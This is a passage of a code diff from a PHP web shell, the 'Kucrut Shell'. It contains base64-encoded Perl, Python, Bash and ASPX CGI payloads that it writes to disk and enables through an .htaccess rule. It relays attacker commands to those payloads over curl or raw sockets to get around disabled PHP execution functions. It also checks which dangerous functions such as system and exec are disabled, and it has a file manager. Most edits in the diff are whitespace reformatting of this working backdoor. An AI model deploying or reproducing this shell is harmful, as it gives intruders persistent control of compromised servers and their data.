-			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
-			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
-			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
-			if($lang == "aspx"){
-				kucrutWriteTocgiapi("aspx.aspx",$aspx);
-			}else{
-				kucrutWriteTocgiapi($lang.".kucrut",$source);
-			}
-			kucrutcgihtaccess('cgi', "kucrutcgiapi/");
-		}else{
-			$lang = $_COOKIE["kucrutcgiapi"];
-		}
-		$cgi_ext = ".kucrut";
-		if($lang=="aspx"){
-			$cgi_ext = ".aspx";
-		}
-		$cgi_url = __HOST_DATA_FOLDER__."/kucrutcgiapi/".$lang.$cgi_ext;
-		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
-		if($is_curl){
-			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$post = new KucrutCURL();
-			$data = $post->Send($address, "post", $cmd);
-		}elseif($is_socket){
-			$server = $_SERVER["SERVER_NAME"];
-			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$data = _kucrut_fsockopen($server,$uri,$cmd);
-		}
-		$out = "";
-		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
-			if($set_cookie){
-				__kucrut_set_cookie("kucrutcgiapi", $lang);
-			}
-			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
-				$out = $res[1];
-			}
-		}elseif($lang=="perl"){
-			return _kucrut_cgicmd($cmd_pure,"py",$set_cookie);
-		}elseif($lang=="py"){
-			return _kucrut_cgicmd($cmd_pure,"bash",$set_cookie);
-		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
-			return _kucrut_cgicmd($cmd_pure,"aspx",$set_cookie);
-		}else{
-			if($set_cookie){
-				__kucrut_set_cookie("kucrutcgiapi_mode", "off");
-			}
-		}
-		return trim($out);
-	}else{
-		return "";
-	}
+    if(!$GLOBALS["DB_NAME"]["cgi_api"]){
+        return "";
+    }
+    if(isset($_COOKIE["kucrutcgiapi_mode"])){
+        return "";
+    }
+    $cmd_pure = $cmd;
+    $is_curl = function_exists('curl_version');
+    $is_socket = function_exists('fsockopen');
+    if($is_curl||$is_socket){
+        $recreate = false;
+        if(isset($_COOKIE["kucrutcgiapi"])){
+            if(!@file_exists("kucrutcgiapi/".$_COOKIE["kucrutcgiapi"].".kucrut")){
+                $recreate = true;
+                $lang = $_COOKIE["kucrutcgiapi"];
+            }
+        }
+        if(!isset($_COOKIE["kucrutcgiapi"])||$recreate){
+            @chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
+            $perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
+            $py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
+            $bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
+            $aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
+            if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
+            if($lang == "aspx"){
+                kucrutWriteTocgiapi("aspx.aspx",$aspx);
+            }else{
+                kucrutWriteTocgiapi($lang.".kucrut",$source);
+            }
+            kucrutcgihtaccess('cgi', "kucrutcgiapi/");
+        }else{
+            $lang = $_COOKIE["kucrutcgiapi"];
+        }
+        $cgi_ext = ".kucrut";
+        if($lang=="aspx"){
+            $cgi_ext = ".aspx";
+        }
+        $cgi_url = __HOST_DATA_FOLDER__."/kucrutcgiapi/".$lang.$cgi_ext;
+        $cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
+        if($is_curl){
+            $address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
+            $post = new KucrutCURL();
+            $data = $post->Send($address, "post", $cmd);
+        }elseif($is_socket){
+            $server = $_SERVER["SERVER_NAME"];
+            $uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
+            $data = _kucrut_fsockopen($server,$uri,$cmd);
+        }
+        $out = "";
+        if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
+            if($set_cookie){
+                __kucrut_set_cookie("kucrutcgiapi", $lang);
+            }
+            if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
+                $out = $res[1];
+            }
+        }elseif($lang=="perl"){
+            return _kucrut_cgicmd($cmd_pure,"py",$set_cookie);
+        }elseif($lang=="py"){
+            return _kucrut_cgicmd($cmd_pure,"bash",$set_cookie);
+        }elseif($lang=="bash" && $GLOBALS['sys']=="win"){
+            return _kucrut_cgicmd($cmd_pure,"aspx",$set_cookie);
+        }else{
+            if($set_cookie){
+                __kucrut_set_cookie("kucrutcgiapi_mode", "off");
+            }
+        }
+        return trim($out);
+    }else{
+        return "";
+    }
 }
 function kucrutGetCwd(){
-	if(function_exists("getcwd")){
-		return @getcwd();
-	}else{
-		return dirname($_SERVER["SCRIPT_FILENAME"]);
-	}
+    if(function_exists("getcwd")){
+        return @getcwd();
+    }else{
+        return dirname($_SERVER["SCRIPT_FILENAME"]);
+    }
 }
 function kucrutEx($in,$re=false,$cgi=true,$all=false){
-	$data = _kucrut_php_cmd($in,$re);
-	if(empty($data)&&$cgi||$all){
-		if($GLOBALS['sys']=='unix'){
-			if(strlen(_kucrut_php_cmd("whoami"))==0||$all){
-				$cmd = _kucrut_cgicmd($in);
-				if(!empty($cmd)){
-					return $cmd;
-				}
-			}
-		}
-	}
-	return $data;
+    $data = _kucrut_php_cmd($in,$re);
+    if(empty($data)&&$cgi||$all){
+        if($GLOBALS['sys']=='unix'){
+            if(strlen(_kucrut_php_cmd("whoami"))==0||$all){
+                $cmd = _kucrut_cgicmd($in);
+                if(!empty($cmd)){
+                    return $cmd;
+                }
+            }
+        }
+    }
+    return $data;
 }
 function _kucrut_php_cmd($in,$re=false){
 $out='';
@@ -792,26 +792,26 @@ $out=$stdout->ReadAll();
 return $out;
 }
 function _kucrut_fsockopen($server,$uri,$post){
-	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
-	if($socket){
-		$http  = "POST {$uri} HTTP/1.0\r\n";
-		$http .= "Host: {$server}\r\n";
-		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
-		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
-		$http .= "Content-length: " . strlen($post) . "\r\n";
-		$http .= "Connection: close\r\n\r\n";
-		$http .= $post . "\r\n\r\n";
-		fwrite($socket, $http);
-		$contents = "";
-		while (!@feof($socket)) {
-			$contents .= @fgets($socket, 4096);
-		}
-		list($header, $body) = explode("\r\n\r\n", $contents, 2);
-		@fclose($socket);
-		return $body;
-	}else{
-		return "";
-	}
+    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
+    if($socket){
+        $http  = "POST {$uri} HTTP/1.0\r\n";
+        $http .= "Host: {$server}\r\n";
+        $http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
+        $http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+        $http .= "Content-length: " . strlen($post) . "\r\n";
+        $http .= "Connection: close\r\n\r\n";
+        $http .= $post . "\r\n\r\n";
+        fwrite($socket, $http);
+        $contents = "";
+        while (!@feof($socket)) {
+            $contents .= @fgets($socket, 4096);
+        }
+        list($header, $body) = explode("\r\n\r\n", $contents, 2);
+        @fclose($socket);
+        return $body;
+    }else{
+        return "";
+    }
 }
 if(isset($_GET["solevisible"])){
 @error_reporting(E_ALL ^ E_NOTICE);
@@ -884,12 +884,12 @@ $GLOBALS["need_to_update_header"] = "false";
 $GLOBALS['glob_chdir_false'] = false;
 if(isset($_POST['c'])){
 if(!@chdir($_POST['c'])){
-	$GLOBALS['glob_chdir_false'] = true;
+    $GLOBALS['glob_chdir_false'] = true;
 }
 }
 $GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@kucrutGetCwd());
 if($GLOBALS['glob_chdir_false']){
-	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @kucrutGetCwd());
+    $GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @kucrutGetCwd());
 }
 if($GLOBALS['sys'] == 'win'){
 $GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
@@ -898,14 +898,14 @@ $GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
 if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
 if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_kucrut_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
 if(!function_exists("mb_strlen")){
-	function mb_strlen($str, $c=""){
-		return strlen($str);
-	}
+    function mb_strlen($str, $c=""){
+        return strlen($str);
+    }
 }
 if(!function_exists("mb_substr")){
-	function mb_substr($str, $start, $end, $c=""){
-		return substr($str, $start, $end);
-	}
+    function mb_substr($str, $start, $end, $c=""){
+        return substr($str, $start, $end);
+    }
 }
 define("KUCRUT_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
 function kucruthead(){
@@ -925,17 +925,17 @@ $func = array('system','exec','shell_exec','proc_open','popen','passthru','symli
 $black_list = array();
 $allow_list = array();
 foreach($s as $d){
-	$d=trim($d);
-	if(empty($d)||!is_callable($d))continue;
-	if(!function_exists($d)){
-		if(in_array($d,$func)){
-			$dis .= $d." | ";$b++;
-			$black_list[] = $d;
-		}else{
-			$allow_list[] = $d;
-		}
-		$i++;
-	}
+    $d=trim($d);
+    if(empty($d)||!is_callable($d))continue;
+    if(!function_exists($d)){
+        if(in_array($d,$func)){
+            $dis .= $d." | ";$b++;
+            $black_list[] = $d;
+        }else{
+            $allow_list[] = $d;
+        }
+        $i++;
+    }
 }
 if($i==0)return($afa);
 if($i <= count($func)){
@@ -1049,7 +1049,7 @@ $drives = "";
 foreach(range('a','z') as $drive)
 if(@is_dir($drive.':\\'))
 $drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
-$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
+$csscode =' -moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
 echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -1059,7 +1059,7 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 <title>..:: '.$_SERVER['HTTP_HOST'].' ~ Kucrut Shell - v'.__HOST_VERSION__.'-'.__HOST_CODE_NAME__.' ::..</title>
 <style type="text/css">';?>
 .hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid 